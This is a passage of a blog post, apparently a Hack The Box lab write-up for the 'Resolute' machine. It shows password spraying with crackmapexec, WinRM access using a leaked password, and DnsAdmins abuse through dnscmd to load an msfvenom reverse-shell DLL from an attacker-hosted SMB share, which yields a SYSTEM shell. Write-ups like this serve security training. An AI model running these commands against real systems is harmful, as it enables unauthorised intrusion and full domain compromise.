+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:RESOLUTE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:megabank.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local<span style="color:#ae81ff">\m</span>arco:Welcome123! STATUS_LOGON_FAILURE
+</span></span></code></pre></div><p>It&rsquo;s not correct but maybe it is for another user, so we will create a user list and fuzz with crackmapexec:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ crackmapexec smb 10.129.74.219 -u users.txt -p Welcome123!
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:RESOLUTE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:megabank.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local<span style="color:#ae81ff">\A</span>dministrator:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local<span style="color:#ae81ff">\G</span>uest:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local<span style="color:#ae81ff">\k</span>rbtgt:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local<span style="color:#ae81ff">\D</span>efaultAccount:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>yan:Welcome123! STATUS_LOGON_FAILURE SOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local<span style="color:#ae81ff">\m</span>arko:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local<span style="color:#ae81ff">\s</span>unita:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.localbigail:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local<span style="color:#ae81ff">\m</span>arcus:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local<span style="color:#ae81ff">\s</span>ally:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local
+</span></span><span style="display:flex;"><span>                                                                      red:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.localngela:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local
+</span></span><span style="display:flex;"><span>                                                                      elicia:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local<span style="color:#ae81ff">\g</span>ustavo:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.locallf:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local<span style="color:#ae81ff">\s</span>tevie:Welcome123! STATUS_LOGON_FAILURE
+</span></span><span style="display:flex;"><span>SMB         10.129.74.219   <span style="color:#ae81ff">445</span>    RESOLUTE         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> megabank.local
+</span></span></code></pre></div><p>For user <em>melanie</em> the password is correct, we can connect through WinRM with <strong>evil-winrm</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ evil-winrm -i 10.129.74.219 -u melanie -p Welcome123!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>elanie<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>Inside the Desktop we can find the user.txt:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\m</span>elanie<span style="color:#ae81ff">\D</span>esktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>d394207d5c2f2434****************
+</span></span></code></pre></div><h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Now let&rsquo;s move on and see what we have.</p>
+<p>In <strong>C:\</strong> there&rsquo;s an unusual directory <strong>PSTranscripts</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> dir -force
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN
+</span></span><span style="display:flex;"><span>d--hsl        9/25/2019  10:17 AM                Documents and Settings
+</span></span><span style="display:flex;"><span>d-----        9/25/2019   6:19 AM                PerfLogs
+</span></span><span style="display:flex;"><span>d-r---        9/25/2019  12:39 PM                Program Files
+</span></span><span style="display:flex;"><span>d-----       11/20/2016   6:36 PM                Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>d--h--        9/25/2019  10:48 AM                ProgramData
+</span></span><span style="display:flex;"><span>d--h--        12/3/2019   6:32 AM                PSTranscripts
+</span></span><span style="display:flex;"><span>d--hs-        9/25/2019  10:17 AM                Recovery
+</span></span><span style="display:flex;"><span>d--hs-        9/25/2019   6:25 AM                System Volume Information
+</span></span><span style="display:flex;"><span>d-r---        12/4/2019   2:46 AM                Users
+</span></span><span style="display:flex;"><span>d-----        12/4/2019   5:15 AM                Windows
+</span></span><span style="display:flex;"><span>-arhs-       11/20/2016   5:59 PM         <span style="color:#ae81ff">389408</span> bootmgr
+</span></span><span style="display:flex;"><span>-a-hs-        7/16/2016   6:10 AM              <span style="color:#ae81ff">1</span> BOOTNXT
+</span></span><span style="display:flex;"><span>-a-hs-        7/13/2022   2:01 PM      <span style="color:#ae81ff">402653184</span> pagefile.sys
+</span></span></code></pre></div><p>A couple directories in we see a PowerShell Transcript:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\P</span>STranscripts<span style="color:#ae81ff">\2</span>0191203&gt; dir -force
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\P</span>STranscripts<span style="color:#ae81ff">\2</span><span style="color:#ae81ff">0191203</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-arh--        12/3/2019   6:45 AM           <span style="color:#ae81ff">3732</span> PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+</span></span></code></pre></div><p>Inside this text file we can find credentials of user ryan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>............
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cmd : The syntax of this command is:
+</span></span><span style="display:flex;"><span>At line:1 char:1
+</span></span><span style="display:flex;"><span>+ cmd /c net use X: <span style="color:#ae81ff">\f</span>s0ackups ryan Serv3r4Admin4cc123!
+</span></span><span style="display:flex;"><span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>............
+</span></span></code></pre></div><p>We can also use this creds with <strong>evil-winrm</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ evil-winrm -i 10.129.74.219 -u <span style="color:#e6db74">&#39;ryan&#39;</span> -p <span style="color:#e6db74">&#39;Serv3r4Admin4cc123!&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>Nice, but it doesn&rsquo;t seem like we have progressed that much we are still just another user.</p>
+<p>So let&rsquo;s get information about ryan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; whoami /groups
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GROUP INFORMATION
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Group Name                                 Type             SID                                            Attributes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==========================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">==============================================</span> <span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\R</span>emote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>MEGABANK<span style="color:#ae81ff">\C</span>ontractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>MEGABANK<span style="color:#ae81ff">\D</span>nsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>Mandatory Label<span style="color:#ae81ff">\M</span>edium Mandatory Level     Label            S-1-16-8192
+</span></span></code></pre></div><p>We are part of DnsAdmins. This group gives us control over the DNS service.</p>
+<p>Using <strong>dnscmd.exe</strong> we can abuse this file changing the dll configuration file of the DNS:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; dnscmd.exe /config /serverlevelplugindll <span style="color:#ae81ff">\\</span>10.10.14.161<span style="color:#ae81ff">\s</span>mbFolder<span style="color:#ae81ff">\p</span>wned.dll
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Registry property serverlevelplugindll successfully reset.
+</span></span><span style="display:flex;"><span>Command completed successfully.
+</span></span></code></pre></div><p>The dll that is going to be used is going to be hosted in a shared folder hosts by us.</p>
+<p>First we have to create the malicious dll file with <strong>msfvenom</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.161 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">334</span> -f dll -o pwned.dll
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">460</span> bytes
+</span></span><span style="display:flex;"><span>Final size of dll file: <span style="color:#ae81ff">8704</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: pwned.dll
+</span></span></code></pre></div><p>Now let&rsquo;s share it through smb using <strong>smbserver.py</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ smbserver.py smbFolder <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span> -smb2support
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
+</span></span></code></pre></div><p>Also set the listener and finally restart the DNS service with <strong>sc.exe</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; sc.exe stop dns
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SERVICE_NAME: dns
+</span></span><span style="display:flex;"><span>        TYPE               : <span style="color:#ae81ff">10</span>  WIN32_OWN_PROCESS
+</span></span><span style="display:flex;"><span>        STATE              : <span style="color:#ae81ff">3</span>  STOP_PENDING
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">(</span>STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        CHECKPOINT         : 0x0
+</span></span><span style="display:flex;"><span>        WAIT_HINT          : 0x0
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>yan<span style="color:#ae81ff">\D</span>ocuments&gt; sc.exe start dns
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SERVICE_NAME: dns
+</span></span><span style="display:flex;"><span>        TYPE               : <span style="color:#ae81ff">10</span>  WIN32_OWN_PROCESS
+</span></span><span style="display:flex;"><span>        STATE              : <span style="color:#ae81ff">2</span>  START_PENDING
+</span></span><span style="display:flex;"><span>                                <span style="color:#f92672">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        WIN32_EXIT_CODE    : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        SERVICE_EXIT_CODE  : <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>0x0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        CHECKPOINT         : 0x0
+</span></span><span style="display:flex;"><span>        WAIT_HINT          : 0x7d0
+</span></span><span style="display:flex;"><span>        PID                : <span style="color:#ae81ff">2296</span>
+</span></span><span style="display:flex;"><span>        FLAGS              :
+</span></span></code></pre></div><p>You might have to do this several times before it works but eventually we will get the connection in the netcat:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ nc -lvnp <span style="color:#ae81ff">334</span>
+</span></span><span style="display:flex;"><span>Ncat: Version 7.92 <span style="color:#f92672">(</span> https://nmap.org/ncat <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Ncat: Listening on :::334
+</span></span><span style="display:flex;"><span>Ncat: Listening on 0.0.0.0:334
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.74.219.
+</span></span><span style="display:flex;"><span>Ncat: Connection from 10.129.74.219:50710.
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.14393<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2016</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>Perfect, we have a shell as SYSTEM, now we can see the root.txt:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>C:\Users\Administrator\Desktop&gt;type root.txt
+</span></span><span style="display:flex;"><span>type root.txt
+</span></span><span style="display:flex;"><span>969fb58ae84b8a******************
+</span></span></code></pre></div><p>See you next time!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://theloganlab.github.io/posts/nunchucks/">
+                <span class="button__icon">←</span>
+                <span class="button__text">HTB: Nunchucks</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://theloganlab.github.io/posts/kotarak/">
+                <span class="button__text">HTB: Kotarak</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+<script src="https://theloganlab.github.io/assets/main.js"></script>
+<script src="https://theloganlab.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
